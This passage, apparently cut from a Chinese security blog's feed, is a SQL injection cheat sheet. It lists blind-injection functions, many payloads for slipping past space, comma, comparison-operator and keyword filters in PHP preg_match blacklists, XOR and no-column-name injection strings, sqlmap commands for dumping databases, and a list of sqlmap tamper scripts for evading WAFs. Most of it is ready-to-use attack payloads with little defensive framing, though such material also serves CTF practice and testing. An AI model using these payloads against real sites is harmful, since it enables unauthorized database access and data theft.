title="布尔"></a>布尔</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">left(user(),1)&gt;'r'  </span><br><span class="line">right(user(),1)&gt;'r'  </span><br><span class="line">substr(user(),1,1)='r'  </span><br><span class="line">mid(user(),1,1)='r' </span><br><span class="line">greatest("sed",database())= "sed" //返回最大值再与字符串比较</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">least</span>(<span class="string">"sea"</span>,<span class="keyword">database</span>())=<span class="string">"sea"</span>; //返回最小值再与字符串比较</span><br><span class="line">    </span><br><span class="line">//不使用逗号 </span><br><span class="line">user() regexp '^[a-z]'</span><br><span class="line">user() like 'root%' //注意_/%通配符，建议写脚本的时候时候写到字符集最后面</span><br><span class="line">POSITION('root' in user())</span><br><span class="line">mid(user() from 1 for 1)='r'</span><br><span class="line">mid(user() from 1)='r'</span><br><span class="line">substr(user() from 1 for 1)='r'</span><br><span class="line">substr(user() from 1)='r'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ASCII()、ORD()和CHAR()函数一般用做辅助。</span><br></pre></td></tr></table></figure><h2 id="Bypass一把梭"><a href="#Bypass一把梭" class="headerlink" title="Bypass一把梭"></a>Bypass一把梭</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p><strong>两个空格代替一个空格，用Tab代替空格，注释代替空格</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 </span><br><span class="line"><span class="comment">/**/</span>  <span class="comment">/*!*/</span></span><br></pre></td></tr></table></figure><br><p><strong>括号绕过空格</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1'and(sleep(ascii(substr(database(),1,1))=109)) <span class="comment">#</span></span><br></pre></td></tr></table></figure><blockquote><p>空格被过滤，括号没有被过滤，可以用括号绕过</p></blockquote><br><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p><strong>盲注（substr(),mid(),limit）</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">//对于limit可以使用offset来绕过</span><br><span class="line">limit 0,1 等价于 limit 1 offset 0</span><br></pre></td></tr></table></figure><br><p><strong>直接替换为like注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'ro%'</span></span><br></pre></td></tr></table></figure><blockquote><p>注意通配符 <code>%</code></p></blockquote><br><p><strong>union + join注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>     </span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure><h3 id="过滤比较符号"><a href="#过滤比较符号" class="headerlink" title="过滤比较符号"></a>过滤比较符号</h3><p><strong>过滤了等号</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">原代码：<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span></span><br><span class="line"></span><br><span class="line">regexp: <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> REGEXP <span class="string">'^1$'</span></span><br><span class="line"></span><br><span class="line">!&lt;&gt;: <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> !(<span class="keyword">id</span>&lt;&gt;<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">in</span>: <span class="keyword">select</span> <span class="string">'user'</span> <span class="keyword">in</span> (<span class="string">'user'</span>);    字符串都是可以用16进制代替的. </span><br><span class="line"></span><br><span class="line">用函数绕过: strcmp(),locate(s1,s) , position(s1 in s) , instr(s,s1),  greatest()</span><br></pre></td></tr></table></figure><br><p><strong>过滤了大于小于</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">greatest(a,b)，返回a和b中较大的那个数。</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">1</span></span><br><span class="line">等价</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">123</span>)=<span class="number">123</span></span><br></pre></td></tr></table></figure><br><h3 id="过滤了if"><a href="#过滤了if" class="headerlink" title="过滤了if"></a>过滤了if</h3><p><strong>case…when…then…else来代替</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">0</span>)</span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span></span><br></pre></td></tr></table></figure><br><h3 id="常见Bypass"><a href="#常见Bypass" class="headerlink" title="常见Bypass"></a>常见Bypass</h3><blockquote><p>PHP中一些常见的过滤方法及绕过方式</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字    and or</span><br><span class="line">php代码    preg_match('/(and|or)/i',$id)</span><br><span class="line">会过滤的攻击代码    1 or 1=1 1 and 1=1</span><br><span class="line">绕过方式    1 || 1=1 1 &amp;&amp; 1=1</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union</span><br><span class="line">php代码    preg_match('/(and|or|union)/i',$id)</span><br><span class="line">会过滤的攻击代码    union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> userid=<span class="number">1</span>)=<span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span> <span class="keyword">or</span> <span class="keyword">union</span> <span class="keyword">where</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where)/i'</span>,$<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span> <span class="keyword">or</span> <span class="keyword">union</span> <span class="keyword">where</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where)/i'</span>,$<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where|limit)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span><span class="comment">#user_id聚合中user_id为1的user为admin</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where|limit|group by)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">group_concat</span>(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> ) = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where|limit|group by|select)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">substr</span>(gruop_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span>) = <span class="number">1</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span>, <span class="string">'</span></span><br><span class="line"><span class="string">php代码    preg_match('</span>/(<span class="keyword">and</span>|<span class="keyword">or</span>|<span class="keyword">union</span>|<span class="keyword">where</span>|<span class="keyword">limit</span>|<span class="keyword">group</span> <span class="keyword">by</span>|<span class="keyword">select</span>|\<span class="string">')/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">substr</span>(gruop_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span>) = <span class="number">1</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; user_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x61</span> <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">unhex</span>(<span class="number">61</span>)</span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span>, <span class="string">', hex</span></span><br><span class="line"><span class="string">php代码    preg_match('</span>/(<span class="keyword">and</span>|<span class="keyword">or</span>|<span class="keyword">union</span>|<span class="keyword">where</span>|<span class="keyword">limit</span>|<span class="keyword">group</span> <span class="keyword">by</span>|<span class="keyword">select</span>|\<span class="string">'|hex)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">unhex</span>(<span class="number">61</span>)</span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">lower</span>(<span class="keyword">conv</span>(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) <span class="comment">#十进制的11转化为十六进制，并小写。</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span>, <span class="string">', hex, substr</span></span><br><span class="line"><span class="string">php代码    preg_match('</span>/(<span class="keyword">and</span>|<span class="keyword">or</span>|<span class="keyword">union</span>|<span class="keyword">where</span>|<span class="keyword">limit</span>|<span class="keyword">group</span> <span class="keyword">by</span>|<span class="keyword">select</span>|\<span class="string">'|hex|substr)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">lower</span>(<span class="keyword">conv</span>(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>))/td&gt;</span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; <span class="keyword">lpad</span>(<span class="keyword">user</span>,<span class="number">7</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span>, <span class="string">', hex, substr, 空格</span></span><br><span class="line"><span class="string">php代码    preg_match('</span>/(<span class="keyword">and</span>|<span class="keyword">or</span>|<span class="keyword">union</span>|<span class="keyword">where</span>|<span class="keyword">limit</span>|<span class="keyword">group</span> <span class="keyword">by</span>|<span class="keyword">select</span>|\<span class="string">'|hex|substr|\s)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; <span class="keyword">lpad</span>(<span class="keyword">user</span>,<span class="number">7</span>,<span class="number">1</span>)/td&gt;</span><br><span class="line">绕过方式    <span class="number">1</span>%<span class="number">0</span>b||%<span class="number">0</span>blpad(<span class="keyword">user</span>,<span class="number">7</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span> <span class="keyword">or</span> <span class="keyword">union</span> <span class="keyword">where</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where)/i'</span>,$<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> || (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> || (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br></pre></td></tr></table></figure><br><h2 id="各种骚姿势一把梭"><a href="#各种骚姿势一把梭" class="headerlink" title="各种骚姿势一把梭"></a>各种骚姿势一把梭</h2><h3 id="update、insert、delete注入"><a href="#update、insert、delete注入" class="headerlink" title="update、insert、delete注入"></a>update、insert、delete注入</h3><p><a href="https://www.anquanke.com/post/id/85487" target="_blank" rel="noopener">MySQL下Update、Insert注入方法</a></p><br><h3 id="pow溢出报错"><a href="#pow溢出报错" class="headerlink" title="pow溢出报错"></a>pow溢出报错</h3><p>pow(x,y)表示计算x的y次方，当计算值过大时，会发生DOUBLE溢出，数据库报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pow</span>(<span class="number">2</span>,<span class="number">2222222222222222222</span>))</span><br></pre></td></tr></table></figure><blockquote><p>过滤了延时语句，正常页面与错误页面没有区别，当sql语句出错时会返回自定义的错误页面。</p></blockquote><br><h3 id="XOR注入"><a href="#XOR注入" class="headerlink" title="XOR注入"></a>XOR注入</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin'^(ascii(mid((password)from(i)))&gt;j)^'1'='1'%23</span><br><span class="line">或者</span><br><span class="line">admin'^(ascii(mid((password)from(i)for(1)))&gt;j)^'1'='1'%23</span><br></pre></td></tr></table></figure><blockquote><p>过滤了关键字：and、or<br>过滤了逗号，<br>过滤了空格</p></blockquote><br><h3 id="regexp注入"><a href="#regexp注入" class="headerlink" title="regexp注入"></a>regexp注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span>语句) regexp <span class="string">'正则'</span></span><br></pre></td></tr></table></figure><blockquote><p>过滤了=、in、like</p></blockquote><br><h3 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h3><p>暂略</p><br><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p><a href="https://xz.aliyun.com/t/4105" target="_blank" rel="noopener">在不知道 MySQL 列名的情况下泄露数据的 SQL 注入技巧</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="string">`4`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line">需要注意字段数，以及回显的地方，以及要查询的东西</span><br></pre></td></tr></table></figure><blockquote><p>适用于：数据泄露或者过滤关键字段名的一把梭</p></blockquote><br><br><h1 id="sqlmap一把梭"><a href="#sqlmap一把梭" class="headerlink" title="sqlmap一把梭"></a>sqlmap一把梭</h1><h2 id="基础指令一把梭"><a href="#基础指令一把梭" class="headerlink" title="基础指令一把梭"></a>基础指令一把梭</h2><p><strong>URL直接注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> --dbs</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> -D xxx --tables</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> -D xxx --tables</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> -D xxx -T xxx --columns</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> -D xxx -T xxx -C xxx --dump</span><br></pre></td></tr></table></figure><p><strong>从文件中加载HTTP请求</strong><br>先从burpsuite Copt to file 然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r <span class="string">"选择你保存的文件的路径"</span></span><br></pre></td></tr></table></figure><blockquote><p>适用于：cookie，POST数据等</p></blockquote><br><h2 id="tamper一把梭"><a href="#tamper一把梭" class="headerlink" title="tamper一把梭"></a>tamper一把梭</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py 在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py 分别用“NOT BETWEEN 0 AND <span class="comment">#”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span></span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line">equaltolike.py 用“LIKE”运算符替换全部等于号“=”</span><br><span class="line">greatest.py 用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加“sp_password” <span class="keyword">for</span> automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py 用“/**/”替换空格符</span><br><span class="line">space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符“<span class="comment">#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line">space2morehash.py 用磅注释符“<span class="comment">#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符“<span class="comment">#”其次是一个换行符替换空格符</span></span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号“+”替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF 2019 Writeup</title>
      <link href="/2019/04/12/DDCTF-2019-writeup/"/>
      <url>/2019/04/12/DDCTF-2019-writeup/</url>
      
